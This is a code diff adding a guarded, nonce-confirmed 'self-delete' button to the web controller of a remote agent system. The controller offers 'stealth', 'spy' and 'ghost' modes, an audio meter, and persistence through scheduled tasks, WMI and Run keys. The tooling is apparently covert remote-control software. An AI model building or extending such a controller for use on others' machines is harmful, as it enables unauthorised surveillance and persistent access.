@@ -239,6 +239,7 @@ html{touch-action:manipulation}
       <button class="btn btn-small" id="verBtn" title="Compare agent version vs controller">≡ Versions</button>
       <button class="btn btn-small" id="pushUpdateBtn" title="Push bundled agent update to selected agent">⇪ Update</button>
       <button class="btn btn-small" id="pushUpdateAllBtn" title="Push bundled update to every outdated agent at once" style="display:none">⇪ Update All</button>
+      <button class="btn btn-small" id="deleteAgentBtn" title="PERMANENTLY delete the agent on the selected box (token + nonce guarded). kill-agent only quiets it.">🗑 Delete</button>
       <button class="btn btn-small" id="wizBtn" title="Open command wizard">🧙</button>
       <select id="topModeSel" class="select" title="Agent operation mode — changes immediately (restarts agent)" style="font-size:11px;padding:2px 4px"><option value="normal">normal</option><option value="stealth">stealth</option><option value="spy">spy</option><option value="ghost">ghost</option><option value="performance">performance</option><option value="kiosk">kiosk</option><option value="audit">audit</option></select>
       <span id="agentVerBadge" style="font-size:11px;color:#888" title="Selected agent version"></span>
@@ -568,6 +569,16 @@ function connectWS(){
       if(m.type==="agents"){ mergeAgents(m.agents||[]); }
       else if(m.type==="output"){
         const t = m.success?"out":"err";
+        // Self-delete nonce: mask it in the terminal, confirm, and send back.
+        if(pendingDeleteArm && /DELETE-NONCE:[0-9a-f]{32}/i.test(m.data||"")){
+          const nonce=(m.data.match(/DELETE-NONCE:([0-9a-f]{32})/i)||[])[1];
+          const host=pendingDeleteArm.host; pendingDeleteArm=null;
+          addTerm(`[${m.id||selected?.id||"agent"}] Nonce received (hidden, valid 5min).`,"out");
+          if(!confirm(`Agent on ${host} returned its confirmation nonce.\n\nLAST CHANCE — permanently delete the agent and ALL persistence on ${host}?\n\nThis cannot be undone except by reinstalling.`)){ addTerm("Self-delete cancelled (nonce discarded).","out"); }
+          else if(!selected||selected.hostname!==host){ toast("Selection changed — re-arm self-delete","err"); }
+          else { sendCmdVal("self-delete "+nonce); addTerm(`Confirming self-delete on ${host}…`,"out"); }
+          return;
+        }
         // Meter unavailable on that PC: stop polling instead of spamming errors
         const txt = `${m.data||""} ${m.error||""}`;
         if(txt.includes("audio level unavailable")){
@@ -961,6 +972,16 @@ function pushAgentUpdateAll(){
     .catch(e=>addTerm("Update All failed: "+(e.message||e), "err"));
 }
 $("pushUpdateAllBtn").onclick=pushAgentUpdateAll;
+// Token-guarded permanent self-delete: arm → nonce (masked) → confirm.
+// kill-agent only quiets the process; this removes everything forever.
+let pendingDeleteArm=null;
+function requestSelfDelete(){
+  if(!needAgent()) return;
+  if(!confirm(`PERMANENTLY delete the agent on ${selected.hostname}?\n\nRemoves every task, WMI set, Run key, backup, and binary. This cannot be undone except by reinstalling.\n\nContinue to arm?`)) return;
+  pendingDeleteArm={host:selected.hostname, at:Date.now()};
+  sendCmdVal("self-delete arm"); addTerm("Arming self-delete…","out");
+}
+$("deleteAgentBtn").onclick=requestSelfDelete;
 function sendCmd(){
   const v=input.value.trim(); if(!v) return;
   history.push(v); if(history.length>50) history.shift(); hIdx=-1;
